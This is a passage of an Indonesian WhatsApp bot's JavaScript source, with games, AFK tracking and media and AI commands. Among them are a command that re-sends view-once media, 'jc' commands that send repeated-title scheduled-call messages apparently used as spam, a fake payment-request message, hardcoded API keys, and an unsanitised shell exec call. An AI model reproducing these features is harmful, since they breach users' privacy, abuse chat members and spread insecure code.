                await m.reply(`🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nAnda mendapatkan hadiah sebesar ${hadiah} balance.`)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                    const hadiahMin = 1;
        const hadiahMax = 20000;
        const hadiah = Math.floor(Math.random() * (hadiahMax - hadiahMin + 1)) + hadiahMin;

        db.data.users[m.sender].balance += hadiah; // Tambahkan hadiah ke balance pengguna
                await m.reply(`🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nAnda mendapatkan hadiah sebesar ${hadiah} balance.`)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                                const hadiahMin = 1;
        const hadiahMax = 20000;
        const hadiah = Math.floor(Math.random() * (hadiahMax - hadiahMin + 1)) + hadiahMin;

        db.data.users[m.sender].balance += hadiah; // Tambahkan hadiah ke balance pengguna
                await m.reply(`🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nAnda mendapatkan hadiah sebesar ${hadiah} balance.`)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
     //tuctac2
const TicTacToeBot = require("./lib/TicTacToeBot");
let tttGames = {};

function getTTTGame(chatId) {
    if (!(chatId in tttGames)) {
        tttGames[chatId] = {
            board: Array(9).fill(null),
            bot: new TicTacToeBot(),
            isBotTurn: false
        };
    }
    return tttGames[chatId];
}
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await sky.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await sky.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    sky.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    sky.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) sky.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) sky.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) sky.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    sky.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) sky.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) sky.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    sky.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            sky.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}`)
            user.afkTime = -1
            user.afkReason = ''
        }	    
        switch(command) {
	    case 'afk': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} Telah Afk${text ? ': ' + text : ''}`)
            }
            break           
                    case 'ttc': case 'ttt': case 'tictactoe': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await sky.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await sky.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
            if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
            delete this.game[roomnya.id]
            m.reply(`Berhasil delete session room tictactoe !`)
            }
            break
case 'addfunc': {
    if (!isCreator) {
        m.reply('Anda tidak memiliki izin untuk menambahkan case baru.');
        return;
    }
    if (!text) {
        m.reply('Silakan masukkan isi function.');
        return;
    }
    const cases = fs.readFileSync('sky.js').toString();
    const caseBody = text;
    const newCase = `${caseBody}\n`;
    const indexOfBreak = cases.lastIndexOf('//ADDG');
    if (indexOfBreak === -1) {
        m.reply('Terjadi kesalahan');
        return;
    }
    const updatedCases = cases.slice(0, indexOfBreak) + newCase + cases.slice(indexOfBreak);
    fs.writeFileSync('sky.js', updatedCases);
    m.reply('Done Added Function!');
    }
    break
case 'deletecase': {
    if (!isCreator) {
        m.reply('Anda tidak memiliki izin untuk menghapus case.');
        return;
    }

    if (!text) {
        m.reply('Silakan masukkan nama case yang ingin dihapus.');
        return;
    }

    const cases = fs.readFileSync('sky.js').toString();
    const caseNameToDelete = text;
    const startIndex = cases.indexOf(`case '${caseNameToDelete}':`);

    if (startIndex === -1) {
        m.reply(`Case '${caseNameToDelete}' tidak ditemukan.`);
        return;
    }

    const endIndex = cases.indexOf('break', startIndex);

    if (endIndex === -1) {
        m.reply('Terjadi kesalahan dalam menemukan titik "break;" dalam kode.');
        return;
    }

    // Menghapus hanya bagian case sampai break saja
    const updatedCases = cases.slice(0, startIndex) + cases.slice(endIndex + 6);
    fs.writeFileSync('sky.js', updatedCases);
    m.reply(`Bagian case '${caseNameToDelete}' berhasil dihapus.`);
    }
    break
case 'ganteng': {
m.reply('apa')
}
break



case 'listafk': {
 const userListAFK = [];

 for (const user in db.data.users) {
 if (db.data.users[user].afkTime !== -1) {
 userListAFK.push({
 user,
 afkTime: db.data.users[user].afkTime,
 afkReason: db.data.users[user].afkReason,
 });
 }
 }

 if (userListAFK.length === 0) {
 m.reply('Tidak ada pengguna yang sedang AFK.');
 } else {
 let response = 'Daftar Pengguna AFK:\n';
 for (const userAFK of userListAFK) {
 response += `User: ${userAFK.user}\nWaktu AFK: ${userAFK.afkTime} detik\nAlasan: ${userAFK.afkReason}\n\n`;
 }
 m.reply(response);
 }
}
 break;
case 'resetafk': {
 for (const user in db.data.users) {
 db.data.users[user].afkTime = -1;
 db.data.users[user].afkReason = '';
 }
 m.reply('Status AFK semua pengguna telah dihapus.');
}
 break;
case 'patrick': {
 m.reply(mess.wait); // Balas dengan pesan penantian
 let anu = await pinterest(`${command}`);
 let result = anu[Math.floor(Math.random() * anu.length)];
 sky.sendImageAsSticker(m.chat, result, m, { packname: global.packname, author: global.author })
}
 break;
 

case 'ping': case 'botstatus': case 'statusbot': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
 const used = process.memoryUsage()
 const cpus = os.cpus().map(cpu => {
 cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			 return cpu
 })
 const cpu = cpus.reduce((last, cpu, _, { length }) => {
 last.total += cpu.total
 last.speed += cpu.speed / length
 last.times.user += cpu.times.user
 last.times.nice += cpu.times.nice
 last.times.sys += cpu.times.sys
 last.times.idle += cpu.times.idle
 last.times.irq += cpu.times.irq
 return last
 }, {
 speed: 0,
 total: 0,
 times: {
			 user: 0,
			 nice: 0,
			 sys: 0,
			 idle: 0,
			 irq: 0
 }
 })
 let timestamp = speed()
 let latensi = speed() - timestamp
 neww = performance.now()
 oldd = performance.now()
 respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
 `.trim()
 m.reply(respon)
 }
 break
case 'madara':
 case 'mikasa':
 case 'miku':
 case 'minato':
 case 'narutos':
 case 'nezuko':
 case 'onepiece':
 case 'pokemon':
 case 'rize':
 case 'sagiri':
 case 'sakura':
 case 'sasuke':
 case 'shina':
 case 'shinka':
 case 'shizuka':
 case 'shota':
 case 'toukachan':
 case 'tsunade':
 case 'yuki': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
 m.reply(mess.wait)
 if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
 db.data.users[m.sender].limit -= 1 // -1 limit
 let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Random%20Anime/${command}.json`);
 let result = anu[Math.floor(Math.random() * anu.length)]; // Declare and initialize 'result' here
 sky.sendMessage(m.chat, { image: { url: result }, caption: mess.done }, { quoted: m });
}
break
case 'takemitchy': {
 if (!text) throw `Yoooo ${pushname}`
 const keys = ["yMA8oOdr", "2fbgCgOB"];
const xx = keys[Math.floor(Math.random() * keys.length)];
 const { data } = await axios.get(`https://api.betabotz.eu.org/api/search/c-ai?prompt=${q}&char=Hanagaki%20Takemitchy&apikey=${xx}`);
 m.reply(`${data.message}`.trim());
}
break


case 'tourl': {
 const axios = require('axios');
 const FormData = require('form-data');
 const fs = require('fs');

 m.reply(mess.wait);

 try {
 const media = await sky.downloadAndSaveMediaMessage(qmsg);
 const buffer = fs.readFileSync(media);

 const { data: html } = await axios.get("https://freeimage.host/");
 const token = html.match(/PF.obj.config.auth_token = "(.+?)";/)[1];

 const form = new FormData();
 form.append("source", buffer, 'file.jpg');
 form.append("type", "file");
 form.append("action", "upload");
 form.append("timestamp", Math.floor(Date.now() / 1000));
 form.append("auth_token", token);
 form.append("nsfw", "0");

 const { data } = await axios.post("https://freeimage.host/json", form, {
 headers: { "Content-Type": "multipart/form-data", ...form.getHeaders() },
 });

 m.reply(data.image.url);
 fs.unlinkSync(media);
 } catch (error) {
 m.reply(`Error: ${error.message}`);
 }
}
break








case 'readviewonce':
case 'rvo': {
  const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
  if (!m.quoted || !m.quoted.message) {
    m.reply('Reply pesan media yang memiliki view-once untuk digunakan.');
    return;
  }
  let type = Object.keys(m.quoted.message)[0];
  let q = m.quoted.message[type];
  let media = await downloadContentFromMessage(q, type === 'imageMessage' ? 'image' : 'video');
  let buffer = Buffer.from([]);
  for await (const chunk of media) {
    buffer = Buffer.concat([buffer, chunk]);
  }
  if (/video/.test(type)) {
    // Mengirim video
    await sky.sendVideo(m.chat, buffer, q.caption || '', m)
  } else if (/image/.test(type)) {
    // Mengirim gambar
    await sky.sendImage(m.chat, buffer, q.caption || '', m)
  } else {
    m.reply('Tipe media tidak didukung.');
  }
  }
  break
case 'jc': {
if (!isCreator) throw mess.owner
 const args = q.split(' | ');
 if (args.length === 2) {
 const titleText = args[0];
 const totalTitles = parseInt(args[1]);

 if (!isNaN(totalTitles) && totalTitles > 0) {
 let title = `${titleText}\n`.repeat(totalTitles);
 const scheduledTimestampMs = Date.now() + 1000; // Jadwal panggilan 1 detik ke depan

 sky.relayMessage(m.chat, {
 scheduledCallCreationMessage: {
 callType: "VOICE",
 scheduledTimestampMs: scheduledTimestampMs,
 title: title,
 inviteCode: 'http://wa.me/6283870640443',
 }
 }, {});
 } else {
 m.reply('Tentukan jumlah total yang valid (angka positif).');
 }
 } else {
 m.reply('Format yang benar: jc [judul] | [jumlah_total]');
 }
}
 break
case 'gptpic': {
 const query = args.join(' '); // Mengambil query dari pesan pengguna
 const playod = { 
 captionInput: query, 
 captionModel: 'default',
 };

 try {
 const response = await axios.post('https://chat-gpt.pictures/api/generateImage', playod, {
 headers: {
 Accept: '*/*',
 'Content-Type': 'application/json',
 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
 }
 });

 const data = response.data;
 if (data.data && data.data[0] && data.data[0].imgs) {
 const imageUrl = data.data[0].imgs; // Mengambil URL gambar dari respons

 // Mengirim gambar ke pengguna
 sky.sendMessage(m.chat, { image: { url: imageUrl } });
 } else {
 m.reply('Tidak dapat menghasilkan gambar sesuai permintaan.');
 }
 } catch (error) {
 console.error(error);
 m.reply('Terjadi kesalahan saat mencoba menghasilkan gambar.');
 }
}
 break
case 'jc2': {
 if (!isCreator) throw mess.owner;
 const args = q.split(' | ');
 
 if (args.length === 3) { // Mengganti jumlah argumen menjadi 3
 const titleText = args[0];
 const totalTitles = parseInt(args[1]);
 const scheduledTime = parseInt(args[2]); // Menambah argumen waktu jadwal

 if (!isNaN(totalTitles) && totalTitles > 0 && !isNaN(scheduledTime) && scheduledTime > 0) {
 const title = `${titleText}\n`.repeat(totalTitles);
 const scheduledTimestampMs = Date.now() + scheduledTime * 1000; // Menghitung waktu jadwal dalam milidetik
 
 sky.relayMessage(m.chat, {
 scheduledCallCreationMessage: {
 callType: "VOICE",
 scheduledTimestampMs: scheduledTimestampMs,
 title: title,
 inviteCode: 'http://wa.me/6283870640443',
 },
 }, { 
 sendNotification: true
 });

 m.reply(`Panggilan suara akan dimulai dalam ${scheduledTime} detik.`);
 } else {
 m.reply('Format yang benar: jc [judul] | [jumlah_total] | [waktu_jadwal (dalam detik)]');
 }
 } else {
 m.reply('Format yang benar: jc [judul] | [jumlah_total] | [waktu_jadwal (dalam detik)]');
 }
}
 break
case 'jcoff':{
if (!isCreator) return m.reply(mess.owner)
 if (!isBotAdmins) throw mess.botAdmin
m.reply('call will be disconnected in 30 minutes')
 }
 break
case 'smooth2': {
 try {
 let set
 if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
 if (/audio/.test(mime)) {
 m.reply(mess.wait)
 let media = await sky.downloadAndSaveMediaMessage(qmsg)
 let ran = getRandom('.mp3')
 exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
 fs.unlinkSync(media)
 if (err) return m.reply(err)
 let buff = fs.readFileSync(ran)
 sky.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
 fs.unlinkSync(ran)
 })
 } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
 } catch (e) {
 m.reply(e)
 }
 }
 break
case 'listchar': {
m.reply(haha)
}
break
			
 
case 'res': {
 await m.reply('```R E S T A R T . . .```');
 process.send('reset');
 }
break
case 'perplexity': {
 if (!text) throw `Hello ${pushname}`
const keys = ["yMA8oOdr", "2fbgCgOB"];
const xx = keys[Math.floor(Math.random() * keys.length)];
 const { data } = await axios.get(`https://api.betabotz.eu.org/api/search/c-ai?prompt=${q}&char=Perplexity%20AI&apikey=${xx}`);
 m.reply(`${data.message}`.trim());
}
break
case 'restart': case 'mulaiulang': {
if (!isCreator) return m.reply(mess.owner)
let bot = db.data.others['restart']
if(bot){
db.data.others['restart'].m = m
db.data.others['restart'].from = from
} else {db.data.others['restart'] = {
m:m,
from:from
}
}
sky.sendMessage(from, {text: `_Restarting_`})
sky.sendMessage(from, {text: "Succes terhubung kembali"})
await sleep(1000)
sky.end('restart')
}
break


case 'realowner': {
const repf = await sky.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
sky.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Ni No Owner Ril`, mentions: [sender]}, { quoted: m })
}
break
case 'addvn': {
 let delb = await sky.downloadAndSaveMediaMessage(quoted)
 await fsx.copy(delb, `./src/ai.mp4`)
 fs.unlinkSync(delb)
 m.reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
 }
 break
 case 'setvidai': {
 let delb = await sky.downloadAndSaveMediaMessage(quoted)
 await fsx.copy(delb, `./src/ai.mp4`)
 fs.unlinkSync(delb)
 m.reply(`Sukses`)
 }
 break
 case 'cekbaik': {
 if (!m.isGroup) throw mess.group;

 const memberCount = participants.length;
 if (memberCount === 0) throw 'Tidak ada anggota grup.';

 // Cek apakah ada mention user
 const mentionedMembers = m.mentionedJid;
 let targetMember = null;

 if (mentionedMembers.length > 0) {
 // Jika ada yang di-mention, pilih secara acak satu dari yang di-mention
 const randomIndex = Math.floor(Math.random() * mentionedMembers.length);
 targetMember = participants.find(member => member.id === mentionedMembers[randomIndex]);
 } else {
 // Jika tidak ada yang di-mention, pilih secara acak dari semua anggota
 const randomIndex = Math.floor(Math.random() * memberCount);
 targetMember = participants[randomIndex];
 }

 if (!targetMember) throw 'Tidak dapat menemukan anggota yang di-mention.';

 const kebaikanPercentage = Math.floor(Math.random() * 100) + 1;

 const responseText = `🌟 *Cek Baik Challenge* 🌟\n\n`;
 const memberInfo = `Nama: **${targetMember.id.split('@')[0]}**\nNomor: *${targetMember.id.replace('@s.whatsapp.net', '')}*\n`;
 const resultInfo = `Kebaikan: **${kebaikanPercentage}%**\n\n`;

 // Menambahkan waktu sekarang
 const currentTime = new Date();
 const formattedTime = `${currentTime.toLocaleDateString()} ${currentTime.toLocaleTimeString()}`;
 const timeInfo = `⌚ *Waktu Sekarang*: ${formattedTime}\n`;

 // Deteksi member berdasarkan awalan nomor
 let indonesiaMembers = 0;
 let malaysiaMembers = 0;

 // List anggota dari negara luar
 const foreignMembersList = [];

 for (const member of participants) {
 const countryCode = member.id.replace(/[^0-9]/g, '').substring(0, 2);
 if (countryCode === '62') {
 indonesiaMembers++;
 } else if (countryCode === '60') {
 malaysiaMembers++;
 } else {
 foreignMembersList.push(`- ${member.id.split('@')[0]}`);
 }
 }

 const countryInfo = `🌍 *Deteksi Anggota Grup*:\n🇮🇩 Indonesia: ${indonesiaMembers} member\n🇲🇾 Malaysia: ${malaysiaMembers} member\n`;

 // Menambahkan list anggota dari negara luar
 let foreignMembersText = '';
 if (foreignMembersList.length > 0) {
 foreignMembersText = `\nList Anggota Luar:\n${foreignMembersList.join('\n')}`;
 }

 // Menambahkan Top Kebaikan Grup
 const topKebaikanMembers = participants
 .slice(0, Math.min(3, participants.length)) // Ambil 3 anggota teratas
 .map(member => `➤ ${member.id.split('@')[0]}: ${Math.floor(Math.random() * 100) + 1}%`);

 const topKebaikanInfo = `\n\n🏆 *Top Kebaikan Grup*:\n${topKebaikanMembers.join('\n')}`;

 // Menambahkan Quotes Motivasi
 const motivationalQuote = `\n\n🌈 *Quotes Motivasi*:\n"Setiap hari adalah kesempatan untuk menjadi lebih baik."`;

 const additionalInfo = `\n\n👤 *Total Anggota Grup*: ${memberCount}`;

 const fullResponse = `${responseText}${memberInfo}${resultInfo}${timeInfo}${countryInfo}${foreignMembersText}${topKebaikanInfo}${motivationalQuote}${additionalInfo}`;

 sky.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'INR',
 amount1000: 1234567,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: `${fullResponse}`,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {}) 
}
break
case 'aii': {
 if (!text) throw `Contoh: ${prefix + command} Apa Itu Rumah`;
 m.reply(mess.wait);
 let ppai = fs.readFileSync(`./src/ai.mp4`)
 axios.get(`https://widipe.com/openai?text=${text}`).then(({ data }) => {
 const caption = `${data.result}`;
 sky.sendMessage(m.chat, { 
 video: ppai, 
 gifPlayback: true, caption }, 
 { quoted: fkontak });
 });
 }
 break
 
 case 'gajian': {
 const gaji = 7000;
 const user = db.data.users[m.sender];

 const lastGajianTime = user.lastGajianTime || 0;
 const currentTime = Date.now();
 const timeDiff = currentTime - lastGajianTime;
 const hoursSinceLastGajian = timeDiff / (1000 * 60 * 60);

 if (hoursSinceLastGajian >= 24) {
 user.balance += gaji;
 user.lastGajianTime = currentTime;
 m.reply(`Selamat! Kamu menerima gaji sebesar ${gaji} balance. Saldo sekarang: ${user.balance} balance.`);
 } else {
 const remainingTime = 24 - hoursSinceLastGajian;
 m.reply(`Maaf, kamu hanya bisa menggunakan gajian sekali dalam 24 jam. Tunggu ${remainingTime.toFixed(2)} jam lagi.`);
 }
}
 break
case 'aimath': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
let zeltoria = await fetch(`https://vihangayt.me/tools/mathssolve?q=${q}`)
let hasil = await zeltoria.json()
 m.reply(`${hasil.data}`.trim())
 }
 break
case 'iky': {
 const userMessage = m.text.toLowerCase(); // Pesan pengguna dalam huruf kecil
 const calculateFunPercentage = (message) => {
 const keywordPercentages = {
 'ganteng': 5,
 'manis': 6,
 'baik': 4,
 'lucu': 7,
 'gemoy': 5,
 'imut': 6,
 'gans': 5,
 'uwu': 8,
 'cool': 6,
 'rawr': 7,
 'sumpah': 4,
 'bgt': 5,
 'keren': 6,
 'gg': 7,
 'sepuh': 4,
 'mantap': 6,
 'cool': 5,
 };

 const badKeywords = {
 'jelek': 12,
 };

 const detectedGoodKeywords = [];
 let badKeywordDetected = false;
 let totalPercentage = 0;

 // Mendeteksi good keywords
 Object.keys(keywordPercentages).forEach((keyword) => {
 const occurrences = (message.match(new RegExp(keyword, 'g')) || []).length;
 const keywordPercentage = keywordPercentages[keyword] * occurrences;

 if (occurrences > 0) {
 detectedGoodKeywords.push(`${keyword}: ${occurrences}`);
 }

 totalPercentage += keywordPercentage;
 });

 // Mendeteksi bad keywords
 Object.keys(badKeywords).forEach((keyword) => {
 const occurrences = (message.match(new RegExp(keyword, 'g')) || []).length;

 if (occurrences > 0) {
 badKeywordDetected = true;
 totalPercentage -= badKeywords[keyword] * occurrences;
 }
 });

 // Batasan maksimum persentase
 const maxPercentage = 200;

 // Hasil seharusnya tanpa memperhitungkan bad keyword
 const expectedPercentage = Math.min(totalPercentage, maxPercentage).toFixed(1).replace(/\.0$/, '');

 // Hasil setelah dikurangkan bad keyword
 const formattedPercentage = Math.max(totalPercentage - (badKeywordDetected ? badKeywords['jelek'] : 0), 0).toFixed(1).replace(/\.0$/, '');

 return { detectedGoodKeywords, badKeywordDetected, expectedPercentage, formattedPercentage };
 };

 const { detectedGoodKeywords, badKeywordDetected, expectedPercentage, formattedPercentage } = calculateFunPercentage(userMessage);

 const goodKeywordsMessage = detectedGoodKeywords.length > 0
 ? `Good keywords:\n- ${detectedGoodKeywords.join('\n- ')}`
 : 'Tidak ada good keyword yang terdeteksi.';

 const badKeywordsMessage = badKeywordDetected
 ? 'Badword detect ❕'
 : detectedGoodKeywords.length === 0
 ? 'Tidak ada bad keyword yang terdeteksi.'
 : '';

